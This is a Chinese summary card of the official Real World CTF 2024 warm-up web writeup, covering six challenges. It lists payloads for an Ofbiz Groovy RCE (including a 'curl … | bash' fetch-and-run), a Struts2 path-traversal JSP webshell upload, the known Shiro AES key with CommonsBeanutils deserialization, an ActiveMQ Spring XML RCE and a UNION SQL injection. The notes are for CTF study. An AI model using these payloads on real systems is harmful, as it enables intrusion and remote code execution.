---
title: "【Real World CTF 6th Writeup】RWCTF 2024 体验赛官方 Writeup"
category: web
tags: ["RealWorldCTF", "web", "Ofbiz-ProgramExport", "Struts2-upload", "path-traversal", "Old-Shiro-AES-CBC"]
signals: ["RealWorldCTF 2024", "Ofbiz-ProgramExport", "Struts2-upload", "path-traversal", "Old-Shiro-AES-CBC", "CommonsBeanutils", "CB-gadget", "ActiveMQ-ClassPathXml", "Spring-XML-RCE", "sqli", "Real", "World", "CTF", "Ofbiz"]
difficulty: hard
source: "https://www.ctfiot.com/162064.html"
tools: ["Django", "Java", "Spring", "curl"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 【Real World CTF 6th Writeup】RWCTF 2024 体验赛官方 Writeup

> 赛事：RealWorldCTF 2024 | 方向：web | 难度：hard | 工具：Django、Java、Spring、curl

## 一句话总结

Real World CTF 6th 2024 体验赛 6 道题官方 WP，覆盖 Ofbiz Groovy RCE/Struts2 上传/Shiro AES 反序列化/ActiveMQ Spring XML RCE/SQL 注入/Captcha 预测。

## 攻击链

1. 1. Ofbiz POST /webtools/control/ProgramExport groovyProgram=["sh","-c","curl requestrepo | bash"].execute()/2. Struts2 upload.action filename ../../../views/a.jsp JSP 一句话木马/3. Old-Shiro AES/CBC/PKCS5Padding 已知密钥 kPH+bIxk5D2deZiIxcaaaA== + CommonsBeanutils 反序列化 + RequestContextHolder 反射 RCE/4. ActiveMQ 61616 端口写 org.springframework.context.support.ClassPathXmlApplicationContext 远程 XML RCE/5. SQL 注入 /tags.php?/alias/aaaaaaa%27||+1=N+union+select+1,flag_value,3,4,5,6,7,8,0,10,11+from+flag/6. captcha seed 预测 random.seed(seed) + Django CSRF token 利用

## 关键 payload

```
Ofbiz groovyProgram  Struts2 filename=../../../views/a.jsp  Shiro key=kPH+bIxk5D2deZiIxcaaaA==  ActiveMQ ClassPathXmlApplicationContext
```

## 经验教训

Ofbiz ProgramExport groovy 沙箱 RCE 经典路径；Struts2 filename 跨目录上传写 JSP；Shiro 已知密钥 + CommonsBeanutils 反序列化是 Java 经典 RCE；ActiveMQ OpenWire 协议可发送 ClassPathXmlApplicationContext 触发 Spring XML RCE。

## 标签

Ofbiz-ProgramExport、Struts2-upload、path-traversal、Old-Shiro-AES-CBC、CommonsBeanutils、CB-gadget、ActiveMQ-ClassPathXml、Spring-XML-RCE、captcha-seed-predict、Django-CSRF

## 参考来源

- https://www.ctfiot.com/162064.html
- 原文件：【Real_World_CTF_6th_Writeup】就是它！RWCTF_2024体验赛官方Writeup奉上！.full.md
